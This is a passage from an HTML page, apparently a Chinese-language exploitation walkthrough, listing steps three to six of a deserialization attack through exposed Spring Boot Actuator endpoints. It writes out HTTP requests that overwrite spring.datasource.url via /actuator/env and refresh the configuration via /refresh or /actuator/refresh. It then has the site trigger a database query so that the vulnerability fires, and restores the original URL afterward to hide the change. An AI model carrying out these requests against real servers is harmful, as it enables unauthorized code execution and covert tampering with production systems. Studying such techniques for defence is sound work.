class="cs9FB05234">POST /actuator/env</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/json</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">{&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;</span><span class="cs7FFD2630">对应属性值</span><span class="cs9FB05234">&quot;}</span></p><h5 class="cs868C439D">
			<a name="步骤四刷新配置"><span class="cs1C2E50E7">步骤四：刷新配置</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs8926E06">spring 1.x</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /refresh</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/x-www-form-urlencoded</span></p><p class="cs40DD2BC9"><span class="cs8926E06">spring 2.x</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /actuator/refresh</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/json</span></p><h5 class="cs868C439D">
			<a name="步骤五触发数据库查询"><span class="cs1C2E50E7">步骤五：触发数据库查询</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">尝试访问网站已知的数据库查询的接口，例如：</span><span class="cs8926E06"> </span><span class="cs9FB05234">/product/list</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</span></p><h5 class="cs868C439D">
			<a name="步骤六恢复正常-jdbc-url"><span class="cs1C2E50E7">步骤六：恢复正常</span><span class="cs4B51D5E4"> jdbc url</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">反序列化漏洞利用完成后，使用</span><span class="cs8926E06"> </span><span class="csE3F655E4">步骤三</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的方法恢复</span><span class="cs8926E06"> </span><span class="csE3F655E4">步骤一</span><span class="cs8926E06"> </span><span class="cs9C1B1871">中记录的</span><span class="cs8926E06"> </span><span class="cs9FB05234">spring.datasource.url</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的原始</span><span class="cs8926E06"> </span><span class="cs9FB05234">value</span><span class="cs8926E06"> </span><span class="cs9C1B1871">值</span></p></body>
</html>
